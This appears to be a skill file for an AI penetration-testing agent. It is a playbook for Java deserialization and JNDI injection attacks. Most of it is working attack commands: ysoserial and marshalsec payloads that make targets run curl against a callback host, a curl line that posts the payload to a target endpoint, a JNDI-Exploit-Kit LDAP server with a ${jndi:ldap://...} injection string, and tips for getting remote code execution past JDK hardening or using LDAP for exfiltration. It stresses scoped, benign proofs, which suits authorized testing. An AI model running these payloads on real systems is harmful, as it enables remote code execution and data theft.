---
name: java-deserialization
description: Java deserialization and JNDI exploitation — ysoserial gadget chains, marshalsec for non-Java-native formats (JSON/XML/Hessian/Kryo/SnakeYAML), JNDI-Exploit-Kit for lookup injection, detection first with rO0AB magic and OOB callbacks, and safe proof discipline.
---

# Java Deserialization / JNDI Playbook

Order of operations: **detect → confirm reachability → prove with a benign callback → escalate only if the engagement scope allows.**

## Detection

- Serialized Java blobs are base64 starting with `rO0AB` (hex `AC ED 00 05`). Grep requests/responses/cookies/Redis values/viewstate for it.
- Non-native formats need the right gadget library present (fastjson, XStream, Hessian, Kryo, SnakeYAML `!!javax.script` types, Jackson default typing).
- `Content-Type: application/x-java-serialized-object` headers; viewstate without MAC (`javax.faces.ViewState` unencrypted).
- In source/decompiled code: `ObjectInputStream.readObject` reachable from request bytes (see `jadx` greps), `XMLDecoder`, `JSON.parseObject(..., Feature.SupportAutoType)`.

## ysoserial (Java-native gadget chains)

```bash
# List available gadget chains
ysoserial 2>/dev/null | head -40

# Probe with a DNS/HTTP callback payload (safe confirmation)
ysoserial CommonsCollections6 'curl http://<interactsh-or-collab-host>/pwn' > /tmp/payload.bin

# Send it where the app reads serialized objects
curl -s --data-binary @/tmp/payload.bin -H 'Content-Type: application/x-java-serialized-object' \
  https://target/api/upload
```

- Chain availability depends on the library **versions** on the classpath — read them from `BOOT-INF/lib/` first and pick accordingly (CommonsCollections5/6 need commons-collections 3.x; CommonsBeanutils1 works standalone-ish in many fat jars; JDK7u21 needs exact old JDKs).
- A gadget chain that crashes the parser (500, connection reset) with no callback still leaks information: the class path resolved. Record it as evidence, keep hunting for a callback-capable chain.

## marshalsec (format-specific gadgets)

```bash
# List supported marshallers
marshalsec 2>&1 | head

# e.g. JSON (jackson) gadget launching a lookup/RCE
marshalsec JacksonTypeUnsafe 'curl http://<callback>/pwn'
# e.g. SnakeYAML arbitrary class construction
marshalsec SnakeYAML 'curl http://<callback>/pwn'
```

Feed the emitted payload through the format's usual endpoint (JSON body, YAML config field, Hessian RPC body).

## JNDI-Exploit-Kit (lookup injection)

For `InitialContext.lookup(userInput)` sinks (Log4Shell, Spring's `JndiLookup`, RMI endpoints):

```bash
# Start the kit server: serves gadgets over LDAP/RMI
jndi-exploit-kit -i <sandbox-ip> -p 1389
# Then deliver: ${jndi:ldap://<sandbox-ip>:1389/TomcatBypass/Command/Base64/....}
```

- JDK hardening matters: remote codebase loading is blocked on JDK ≥ 8u191 — but local factory gadgets (`TomcatBypass`/`GroovyBypass`) can still land RCE; otherwise use the LDAP server as an **exfiltration/data-return** oracle.
- The sandbox's outbound traffic flows through Caido — watch the proxy log to confirm the target actually made the LDAP bind.

## Proof Discipline

- Confirm with DNS/HTTP callbacks (interactsh is in the image) or a benign file write (`touch /tmp/<random>` + list it back). Never destroy data or pivot beyond the target.
- One clean callback > five noisy exploit attempts; each failed chain attempt can crash a worker thread — pace and observe.
- Report the full chain: endpoint → sink class:method (from decompilation) → gadget library + version → proof artifact (callback ID, created file).
